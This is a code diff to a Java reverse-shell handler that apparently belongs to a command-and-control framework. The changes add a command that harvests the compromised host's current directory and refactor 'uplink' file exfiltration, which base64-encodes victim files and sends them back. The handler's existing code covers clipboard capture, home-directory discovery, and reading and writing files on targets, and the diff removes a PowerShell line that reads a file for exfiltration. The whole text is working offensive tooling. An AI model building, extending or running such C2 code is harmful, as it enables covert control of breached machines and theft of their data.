@@ -18,6 +18,7 @@ import c2.Commands;
 import c2.Constants;
 import c2.http.HTTPSManager;
 import c2.session.IOManager;
+import c2.tcp.harvest.TCPHarvest;
 import util.Time;
 import util.test.OutputStreamWriterHelper;
 import util.test.TestConfiguration;
@@ -36,6 +37,8 @@ public class TCPShellHandler implements Runnable {
 
 	private SocketReader lsr = null;
 
+	private TCPHarvest harvest;
+	
 	public static String CAT_CMD = "cat ";
 	public static String UPLINK_CMD = "uplink ";
 	public static String DOWNLOAD_CMD = "<control> download ";
@@ -62,6 +65,7 @@ public class TCPShellHandler implements Runnable {
 	public void run() {
 		try {
 			OutputStreamWriter bw = new OutputStreamWriter(new BufferedOutputStream(socket.getOutputStream()));
+			harvest = new TCPHarvest(lsr, ioManager, sessionId, bw, Paths.get(lz, hostname));
 			while (stayAlive) {
 				String response = lsr.readUnknownLinesFromSocket();
 
@@ -77,12 +81,8 @@ public class TCPShellHandler implements Runnable {
 						operateNixCommand(bw, nextCommand);
 					}
 
-					try {
-						Thread.sleep(1000);
-					} catch (InterruptedException e) {
-					}
 				}
-				response = lsr.readUnknownLinesFromSocket();
+				response = lsr.readUnknownLinesFromSocketWithTimeout(1000);
 
 				if (response.length() != 0) {
 					ioManager.sendIO(sessionId, response);
@@ -111,11 +111,7 @@ public class TCPShellHandler implements Runnable {
 			String homedirCommand = "echo ~" + Constants.NEWLINE;
 			bw.write(homedirCommand);
 			bw.flush();
-			try {
-				Thread.sleep(1000);
-			} catch (InterruptedException e) {
-			}
-			String response = lsr.readUnknownLinesFromSocket();
+			String response = lsr.readUnknownLinesFromSocketWithTimeout(1000);
 			String lines[] = response.split(Constants.NEWLINE);
 			response = lines[0];
 
@@ -126,8 +122,7 @@ public class TCPShellHandler implements Runnable {
 				String listHomedirContent = "ls /home" + Constants.NEWLINE;
 				bw.write(listHomedirContent);
 				bw.flush();
-				Time.sleepWrapped(1000);
-				response = lsr.readUnknownLinesFromSocket();
+				response = lsr.readUnknownLinesFromSocketWithTimeout(1000);
 				if (response.contains(username)) {
 					response = "/home/" + username;
 				} else {
@@ -141,6 +136,10 @@ public class TCPShellHandler implements Runnable {
 			sb.append(System.lineSeparator());
 			sb.append(System.lineSeparator());
 			ioManager.sendIO(sessionId, sb.toString());
+		}else if(nextCommand.equals(Commands.CLIENT_CMD_HARVEST_CURRENT_DIRECTORY)) {
+			String pwd = lsr.getPwd(bw, sessionId);
+			harvest.harvestPwd(pwd.replace(Constants.NEWLINE, ""));
+			ioManager.sendIO(sessionId, "Harvest operation complete"+ System.lineSeparator());
 		}else if(nextCommand.equalsIgnoreCase(Commands.CLIENT_CMD_OS_HERITAGE)) {
 			StringBuilder sb = new StringBuilder();
 			if(myOS == OS.LINUX) {
@@ -156,32 +155,17 @@ public class TCPShellHandler implements Runnable {
 			bw.flush();
 		} else if (nextCommand.startsWith(UPLINK_CMD)) {
 			String targetFilename = nextCommand.substring(UPLINK_CMD.length());
-			String mod = "base64 '" + targetFilename + "'";
-			bw.write(mod);
-			bw.write(Constants.NEWLINE);
-			bw.flush();
 			try {
-				Thread.sleep(2500);
-			} catch (InterruptedException e) {
-			}
-			String response = lsr.readUnknownLinesFromSocket();
-			if (response.length() == 0 || response.contains("No such file or directory")) {
-				ioManager.sendIO(sessionId, "Invalid uplink directive" + System.lineSeparator());
-			} else {
-				response = response.replace(Constants.NEWLINE, "");
-				response = response + System.lineSeparator();
-				String toClientMsg = "<control> uplinked " + targetFilename + " " + response;
+				String b64 = lsr.uplinkFileBase64(targetFilename, bw, sessionId);
+				b64 = b64 + System.lineSeparator();
+				String toClientMsg = "<control> uplinked " + targetFilename + " " + b64;
 				ioManager.sendIO(sessionId, toClientMsg);
+			}catch(Exception ex) {
+				ioManager.sendIO(sessionId, "Invalid uplink directive" + System.lineSeparator());
 			}
+			
 		}else if (nextCommand.startsWith("cd")) {
-			bw.write(nextCommand);
-			bw.write(Constants.NEWLINE);
-			bw.write("pwd");
-			bw.write(Constants.NEWLINE);
-			bw.flush();
-			Time.sleepWrapped(1000);
-			String response = lsr.readUnknownLinesFromSocket();
-			ioManager.sendIO(sessionId, response);
+			lsr.executeCd(nextCommand, ioManager, bw, sessionId);
 		} else if (nextCommand.startsWith(DOWNLOAD_CMD)) {
 			String args[] = nextCommand.split(" ");
 			if (args.length < 4) {
@@ -199,22 +183,14 @@ public class TCPShellHandler implements Runnable {
 				bw.write(downloadCommand);
 				bw.write(Constants.NEWLINE);
 				bw.flush();
-				try {
-					Thread.sleep(1000);
-				} catch (InterruptedException e) {
-				}
-				String response = lsr.readUnknownLinesFromSocket();
+				String response = lsr.readUnknownLinesFromSocketWithTimeout(1000);
 				//System.out.println("-" + response + "-" );
 				
 				String mod = "base64 '" + filename + "'";
 				bw.write(mod);
 				bw.write(Constants.NEWLINE);
 				bw.flush();
-				try {
-					Thread.sleep(2500);
-				} catch (InterruptedException e) {
-				}
-				response = lsr.readUnknownLinesFromSocket();
+				response = lsr.readUnknownLinesFromSocketWithTimeout(2500);
 				response = response.replace(Constants.NEWLINE, "");
 				//System.out.println("-" + args[args.length - 1] + "-" );
 				//System.out.println("-" + response + "-" );
@@ -237,14 +213,13 @@ public class TCPShellHandler implements Runnable {
 				bw.write(nextCommand);
 				bw.write(Constants.NEWLINE);
 				bw.flush();
-				Time.sleepWrapped(1000);
 				if (nextCommand.contains(">>")) {
 					ioManager.sendIO(sessionId, "Appended file" + System.lineSeparator());
 				} else if (nextCommand.contains(">")) {
 					ioManager.sendIO(sessionId, "File write executed" + System.lineSeparator());
 				} else {
 					// Throw a line break in b/c the read file might not have one
-					String response = lsr.readUnknownLinesFromSocket();
+					String response = lsr.readUnknownLinesFromSocketWithTimeout(1000);
 					if (response.length() != 0) {
 						ioManager.sendIO(sessionId, response + System.lineSeparator());
 						ioManager.sendIO(sessionId, System.lineSeparator());
@@ -277,11 +252,7 @@ public class TCPShellHandler implements Runnable {
 			bw.write("echo %USERPROFILE%");
 			bw.write(System.lineSeparator());
 			bw.flush();
-			try {
-				Thread.sleep(1000);
-			} catch (InterruptedException e) {
-			}
-			String response = lsr.readUnknownLinesFromSocket();
+			String response = lsr.readUnknownLinesFromSocketWithTimeout(1000);
 
 			String lines[] = response.split(System.lineSeparator());
 			sb.append("Home Directory: " + lines[0]);
@@ -291,29 +262,9 @@ public class TCPShellHandler implements Runnable {
 			sb.append(System.lineSeparator());
 			ioManager.sendIO(sessionId, sb.toString());
 		}else if (nextCommand.startsWith("cd")) {
-			bw.write(nextCommand);		
-			bw.write(System.lineSeparator());
-			bw.flush();
-			Time.sleepWrapped(500);
-			String response = lsr.readUnknownLinesFromSocket();
-			bw.write("echo %CD%");
-			bw.write(System.lineSeparator());
-			bw.flush();
-			Time.sleepWrapped(500);
-			response = lsr.readUnknownLinesFromSocket();
-			String lines[] = response.split(System.lineSeparator());
-			ioManager.sendIO(sessionId, lines[0].concat(System.lineSeparator()));
+			lsr.executeCd(nextCommand, ioManager, bw, sessionId);
 		} else if (nextCommand.equalsIgnoreCase("pwd")) {
-			bw.write("echo %CD%");
-			bw.write(System.lineSeparator());
-			bw.flush();
-			try {
-				Thread.sleep(1000);
-			} catch (InterruptedException e) {
-			}
-			String response = lsr.readUnknownLinesFromSocket();
-			String lines[] = response.split(System.lineSeparator());
-			ioManager.sendIO(sessionId, lines[0].concat(System.lineSeparator()));
+			ioManager.sendIO(sessionId, lsr.getPwd(bw, sessionId).concat(System.lineSeparator()));
 		} else if (nextCommand.equalsIgnoreCase("ps")) {// TODO Test me!
 			bw.write("tasklist");
 			bw.write(System.lineSeparator());
@@ -324,12 +275,8 @@ public class TCPShellHandler implements Runnable {
 			// System.out.println(clipCommand);
 			bw.write(System.lineSeparator());
 			bw.flush();
-			try {
-				Thread.sleep(1000);
-			} catch (InterruptedException e) {
-			}
 			// System.out.println("Reading...");
-			String response = lsr.readUnknownLinesFromSocket();
+			String response = lsr.readUnknownLinesFromSocketWithTimeout(1000);
 			// System.out.println("res: " + response);
 
 			String baseDir = lz + File.separator + hostname + username;
@@ -343,25 +290,12 @@ public class TCPShellHandler implements Runnable {
 			ioManager.sendIO(sessionId, "Clipboard captured" + System.lineSeparator());
 		} else if (nextCommand.startsWith(UPLINK_CMD)) {
 			String targetFilename = nextCommand.substring(UPLINK_CMD.length());
-			String uplinkCommand = "powershell -c \"[Convert]::ToBase64String((Get-Content -Path '" + targetFilename
-					+ "' -Encoding Byte))\"";
-			// System.out.println(uplinkCommand);
-			bw.write(uplinkCommand);
-			bw.write(System.lineSeparator());
-			bw.flush();
 			try {
-				Thread.sleep(2500);
-			} catch (InterruptedException e) {
-			}
-			// System.out.println("Reading...");
-			String response = lsr.readUnknownLinesFromSocket();
-			// System.out.println("Read: " + response.length());
-			String lines[] = response.split(System.lineSeparator());
-			if (lines.length != 0 && !response.contains("Get-Content : Cannot find path")) {
-				response = lines[0].concat(System.lineSeparator());
-				String toClientMsg = "<control> uplinked " + targetFilename + " " + response;
+				String b64 = lsr.uplinkFileBase64(targetFilename, bw, sessionId);
+				b64 = b64.concat(System.lineSeparator());
+				String toClientMsg = "<control> uplinked " + targetFilename + " " + b64;
 				ioManager.sendIO(sessionId, toClientMsg);
-			} else {
+			}catch(Exception ex) {
 				ioManager.sendIO(sessionId, "Invalid uplink directive" + System.lineSeparator());
 			}
 		} else if (nextCommand.startsWith(DOWNLOAD_CMD)) {
@@ -382,11 +316,7 @@ public class TCPShellHandler implements Runnable {
 				bw.write(downloadCommand);
 				bw.write(System.lineSeparator());
 				bw.flush();
-				try {
-					Thread.sleep(1000);
-				} catch (InterruptedException e) {
-				}
-				String msg = lsr.readUnknownLinesFromSocket();
+				String msg = lsr.readUnknownLinesFromSocketWithTimeout(1000);
 				if (msg.contains("Exception calling \"FromBase64String\"")) {
 					String toClientMsg = "Invalid download directive" + System.lineSeparator();
 					ioManager.sendIO(sessionId, toClientMsg);
@@ -396,6 +326,10 @@ public class TCPShellHandler implements Runnable {
 				}
 
 			}
+		}else if(nextCommand.equals(Commands.CLIENT_CMD_HARVEST_CURRENT_DIRECTORY)) {
+			String pwd = lsr.getPwd(bw, sessionId);
+			harvest.harvestPwd(pwd);
+			ioManager.sendIO(sessionId, "Harvest operation complete"+ System.lineSeparator());
 		} else if (nextCommand.startsWith(CAT_CMD)) {
 			if (isACatReadCmd(nextCommand)) {// read file
 				if (nextCommand.startsWith(CAT_CMD + "-n ")) {// TODO: Have mode for line numbers
@@ -405,11 +339,7 @@ public class TCPShellHandler implements Runnable {
 					bw.write(System.lineSeparator());
 					bw.flush();
 				}
-				try {
-					Thread.sleep(1000);
-				} catch (InterruptedException e) {
-				}
-				String response = lsr.readUnknownLinesFromSocket();
+				String response = lsr.readUnknownLinesFromSocketWithTimeout(1000);
 				ioManager.sendIO(sessionId, response);
 			} else if (nextCommand.charAt(CAT_CMD.length()) == '>') {
 				processCatBuildWrite(nextCommand, bw, OS.WINDOWS);
@@ -421,12 +351,8 @@ public class TCPShellHandler implements Runnable {
 				bw.write(modCommand);
 				bw.write(System.lineSeparator());
 				bw.flush();
-				try {
-					Thread.sleep(1000);
-				} catch (InterruptedException e) {
-				}
 				// Flush line feed from type command
-				lsr.readUnknownLinesFromSocket();
+				lsr.readUnknownLinesFromSocketWithTimeout(1000);
 				if (nextCommand.contains(">>")) { // >> for file append
 					ioManager.sendIO(sessionId, "Appended file" + System.lineSeparator());
 				} else { // When > for file write
@@ -500,11 +426,7 @@ public class TCPShellHandler implements Runnable {
 					bw.flush();
 				}
 				bw.flush();
-				try {
-					Thread.sleep(1000);
-				} catch (InterruptedException e) {
-				}
-				lsr.readUnknownLinesFromSocket();
+				lsr.readUnknownLinesFromSocketWithTimeout(1000);
 				ioManager.sendIO(sessionId, "Data written" + System.lineSeparator());
 			} else {// Append existing
 				String filename = nextCommand.substring(CAT_CMD.length() + 2);
@@ -520,11 +442,7 @@ public class TCPShellHandler implements Runnable {
 					}
 				}
 				bw.flush();
-				try {
-					Thread.sleep(2000);
-				} catch (InterruptedException e) {
-				}
-				lsr.readUnknownLinesFromSocket();
+				lsr.readUnknownLinesFromSocketWithTimeout(2000);
 				ioManager.sendIO(sessionId, "Data written" + System.lineSeparator());
 			}
 		} else {
